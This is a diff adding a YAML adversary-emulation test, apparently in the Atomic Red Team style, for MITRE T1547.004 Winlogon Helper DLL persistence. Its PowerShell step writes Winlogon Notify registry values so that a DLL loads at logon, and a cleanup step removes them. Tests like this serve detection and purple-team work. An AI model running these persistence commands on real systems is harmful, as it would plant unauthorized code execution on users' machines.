@@ -1,0 +1,40 @@
+api_version: "2.0"
+name: Winlogon Notify Key Logon Persistence - PowerShell
+description: |
+    PowerShell code to set Winlogon Notify key to execute a notification package DLL at logon.
+
+    Upon successful execution, PowerShell will modify a registry value to execute atomicNotificationPackage.dll upon logon.
+
+    Please note that Winlogon Notifications have been removed as of Windows Vista / Windows Server 2008 and that this test thus only applies to erlier versions of Windows.
+args:
+    - name: function_to_execute
+      type: string
+      default: AtomicTestFunction
+    - name: binary_to_execute
+      type: path
+      default: C:\Windows\Temp\atomicNotificationPackage.dll
+uuid: d40da266-e073-4e5a-bb8b-2b385023e5f9
+mitre:
+    tactics:
+        - 'TA0003: Persistence'
+        - 'TA0004: Privilege Escalation'
+    techniques:
+        - 'T1547: Boot or Logon Autostart Execution'
+    subtechniques:
+        - 'T1547.004: Winlogon Helper DLL'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: winlogon-notify-key-logon-persistence---powershell
+      inline: |
+        New-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" -Force
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "DllName" "{{.Args.binary_to_execute}}" -Type ExpandString -Force
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Logon" "{{.Args.function_to_execute}}" -Force
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Impersonate" 1 -Type DWord -Force
+        Set-ItemProperty "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify\AtomicRedTeam" "Asynchronous" 0 -Type DWord -Force
+      executor: powershell
+      cleanup:
+        inline: |
+            Remove-Item "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify" -Force -ErrorAction Ignore
+        executor: powershell
